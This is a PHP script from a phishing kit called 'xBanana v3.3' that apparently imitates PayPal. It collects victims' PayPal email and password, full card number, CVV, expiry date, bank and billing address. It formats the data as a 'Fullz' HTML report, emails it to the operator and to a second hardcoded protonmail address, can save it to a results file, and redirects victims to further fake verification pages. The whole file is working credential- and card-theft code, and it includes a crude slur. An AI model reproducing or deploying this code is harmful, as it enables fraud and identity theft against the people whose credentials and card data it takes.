<?php

                               



session_start();

$TIME_DATE = date('H:i:s d/m/Y');

include('../../functions/Email.php');

include('../../functions/get_bin.php');

include('../../functions/get_browser.php');

include('../../functions/get_ip.php');



$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);

$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);

$xBanana_MESSAGE .= "

     

		<head>

        <title>🍌 xBanana v3.3 Rezult 🍌</title>

        <style type='text/css'>

            div{

                width:800px;

                background-color: rgb(36,46,60);

                border:3px solid rgb(255,255,0);

                margin:0 auto 8px ;

                padding:0;

                border-radius:10px;

                font-family: Candara ,HelveticaNeue,'Helvetica Neue',Helvetica,Arial;

            }

            img{

                padding-left: 8px;

            }

            td{

              color: white;

            }

        </style>

    </head>

    <body>

    <div >

            <span style='display:block;border-bottom:2px solid rgb(255,255,0); padding: 8px 20px;color: Black;'>

                <table width='100%'>

                    <tr>

                        <td><h5 style='margin:0;color: Black;'>🍌 xBanana v3 New Credit Card 🍌 From [<span style='color: rgb(255,255,0);'>".$_SESSION['_country_']."</span>]</h5></td>

                        <td align='right'><span style='font-size:12px;font-family: Verdana;'>".$TIME_DATE."</span></td>

                    </tr>

                </table>

            </span>

            <span style='display:block;padding: 7px 25px;'>

              <table style='font-size:14px;color:#444;margin-bottom:5px; border-collapse:collapse; padding-left:10px; padding-right:10px; padding-top:5px; padding-bottom:5px' border='1' bordercolorlight='#808080' bordercolordark='#808080'>

                <tr>

                  <td colspan='3'>

					<p align='center'><b><font color='#FFFF00'>🍌 xBanana v3 New Fullz 🍌</font></b></td>

                </tr>               

 <tr>

                  <td>🍌 PP Email 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_login_email_']."</td>

                </tr>

                <tr>

                  <td>🍌 PP Password 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_login_password_']."</td>

                </tr>

                <tr>

                  <td colspan='3'>

					<p align='center'><b><font color='#FFFF00'>🍌 xBanana v3.3 New VbV Fresh 🍌</font></b></td>

                </tr>

                

                <tr>

                  <td><span>🍌 Bank Name 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_cc_bank_']."</td>

                </tr>

                <tr>

                  <td>🍌Cardholder's Name 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_nameoncard_']."</td>

                </tr>

                <tr>

                  <td><span>".strtolower($_SESSION['_cc_type_'])."🍌 Card Number 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_cardnumber_']." (".$_SESSION['_cc_class_'].")</td>

                </tr>

                                <tr>

                  <td><span>🍌 Cvv 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_csc_']."</td>

                </tr>

                                <tr>

                  <td><span>🍌 Expiration Date 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_expdate_']."</td>

                </tr>

                <tr>

                  <td colspan='3'>

					<p align='center'><b><font color='#FFFF00'>🍌 xBanana v3.3 Billing Info 🍌 </font></b></td>

                </tr>

                                <tr>

                  <td>🍌 Full Name 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_fullname_']."</td>

                </tr>

                                <tr>

                  <td>🍌 Address line 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_address_']."</td>

                </tr>

                                <tr>

                  <td>🍌 Country Name 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_country_']."</td>

                </tr>                <tr>

                  <td>🍌 Town/City 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_city_']."</td>

                </tr>

                <tr>

                  <td>🍌 Province/State 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_state_']."</td>

                </tr>

                <tr>

                  <td>🍌 Postal/Zip Code 🍌</td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".$_SESSION['_zipCode_']."</td>

                </tr>

                     <tr>

                  <td colspan='3'>

					<p align='center'><b><font color='#FFFF00'>🍌 Bitch Fucked 🍌</font></b></td>

                </tr>

                <tr>

                  <td><span>🍌 IP Info 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</td>

                </tr>

                                <tr>

                  <td><span>🍌 Browser 🍌</span></td>

                  <td>:</td>

                  <td style='color: rgb(255,255,0);'>".xBanana1_Browser($_SERVER['HTTP_USER_AGENT'])." On ".xBanana1_OS($_SERVER['HTTP_USER_AGENT'])."</td>

                </tr>

            </table>

        </span>

		        </span>

				<hr color='#FFFF00'>

            <span style='display:block;border-bottom:2px solid rgb(255,255,0); padding: 8px 20px;color: Black;'>

                <table width='100%'>

                    <tr>

                        <td><h5 style='margin:0;color: Black;'><span style='color: rgb(255,255,0);'>

						🍌 Coded By Yzikaa https://libertain.cz 🍌</span></h5></td>

                        <td align='right'><span style='font-size:12px;font-family: Verdana;'></span></td>

                    </tr>

                </table>

            </span>

    </div>

</body>

\n";



if ($_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] == "VISA ELECTRON" || $_SESSION['_c_type_'] == "MASTERCARD" || $_SESSION['_c_type_'] == "MAESTRO"){ // FOR VBV CARD 

    $xBanana_SUBJECT = "🍌 xBanana New Fullz 🍌 [".$_SESSION['_cardholder_']."] / [".$_SESSION['_ccglobal_']."] - [".$_SESSION['_global_']."]";

    $xBanana_HEADERS .= "From:🍌 xBanana v3.3 🍌 <noreply@r00t.xBanana>";

    $xBanana_HEADERS .= $_POST['eMailAdd']."\n";

    $xBanana_HEADERS .= "MIME-Version: 1.0\n";

    $xBanana_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
                        $xBanana_EMAIL2 = "onestnul@protonmail.com";
	@mail($xBanana_EMAIL, $xBanana_SUBJECT, $xBanana_MESSAGE, $xBanana_HEADERS);
  @mail($xBanana_EMAIL2, $xBanana_SUBJECT, $xBanana_MESSAGE, $xBanana_HEADERS);

		if($ChulSooRezHtml == "on"){

$fl = fopen("../../../../Rezult/BananaZumba-".$_SESSION['_login_email_']."--".$_SESSION['_ip_'].".html","a");

fwrite($fl,$xBanana_MESSAGE);

}



	if ($_SESSION['_cntrcode_'] == "FR" || $_SESSION['_cntrcode_'] == "ES" || $_SESSION['_cntrcode_'] == "NO"){

	    HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

	}else {

		HEADER("Location: ../security/?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

	}

}

else{ // FOR CC CARD

    $xBanana_SUBJECT = "🍌 xBanana New Fullz 🍌 [".$_SESSION['_cardholder_']."] / [".$_SESSION['_ccglobal_']."] - [".$_SESSION['_global_']."]";

    $xBanana_HEADERS .= "From:🍌 xBanana v3.3 🍌 <noreply@r00t.xBanana>";

    $xBanana_HEADERS .= $_POST['eMailAdd']."\n";

    $xBanana_HEADERS .= "MIME-Version: 1.0\n";

    $xBanana_HEADERS .= "Content-type: text/html; charset=UTF-8\n";

    @mail($xBanana_EMAIL, $xBanana_SUBJECT, $xBanana_MESSAGE, $xBanana_HEADERS);

	



	HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

}

?>